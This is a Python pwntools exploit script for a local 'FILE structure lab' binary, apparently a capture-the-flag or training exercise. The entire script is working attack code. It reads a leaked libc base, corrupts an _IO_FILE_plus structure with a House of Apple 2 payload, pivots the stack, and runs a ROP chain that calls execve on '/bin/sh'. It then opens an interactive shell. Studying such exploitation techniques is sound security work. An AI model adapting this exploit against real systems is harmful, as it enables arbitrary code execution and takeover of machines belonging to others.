#!/usr/bin/env python3

import sys

import pwn

from house_of_apple2 import HouseOfApple2

bin_filename = "/lab/target"
bin_elf = pwn.ELF(bin_filename)
libc_elf = bin_elf.libc

gdbscript = """
break *main
break *win
continue
"""


def get_libc(p):
    p.recvuntil(b"libc base = ")
    libc_elf.address = int(p.recvline()[:-1], 16)
    print(f"libc base: {libc_elf.address:#x}")


def rop(p):
    # open a file
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"1")
    p.recvline()
    p.sendline(b"0")
    p.recvuntil(b"fopen(")
    p.recvuntil(b" = ")
    fp = int(p.recvline()[:-1], 16)
    print(f"fp @ {fp:#x}")

    # overwrite _IO_FILE_plus struct
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"6")
    p.recvline()
    p.sendline(b"0")
    p.recvuntil(b"[*] reading")

    ret = libc_elf.address + 0x38D00
    mov_rsp_rdx = libc_elf.address + 0x6310F
    pop_rdi = libc_elf.address + 0x11BC7A
    pop_rsi = libc_elf.address + 0x5C2E7
    binsh = libc_elf.address + 0x1DB799

    rop_chain = (
        pwn.p64(ret)  # avoid _flags & 0x8, _flags & 0x2
        + pwn.p64(pop_rdi)
        + pwn.p64(binsh)
        + pwn.p64(pop_rsi)
        + pwn.p64(0x0)  # _IO_write_base = NULL
        + pwn.p64(libc_elf.symbols["execve"])
    )

    _IO_wfile_jumps = libc_elf.symbols["_IO_wfile_jumps"]
    ptr_to_zero = bin_elf.bss(0xA00)
    hoa2 = HouseOfApple2(_IO_wfile_jumps, ptr_to_zero)

    # pivot stack and then ROP
    payload = hoa2.fwrite_payload(fp, mov_rsp_rdx, rop_chain)
    p.send(payload)

    # execute fwrite to trigger the arbitrary call
    p.recvuntil(b"=== FILE structure lab ===")
    p.sendline(b"2")
    p.recvline()
    p.sendline(b"0")
    p.recvline()
    p.sendline(b"1")
    p.recvline()
    p.sendline(b"A")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(bin_filename, env={}, gdbscript=gdbscript)
    else:
        p = pwn.process(bin_filename, env={})

    get_libc(p)
    rop(p)
    p.sendline(b"ls -la /")
    p.interactive()


if __name__ == "__main__":
    main()
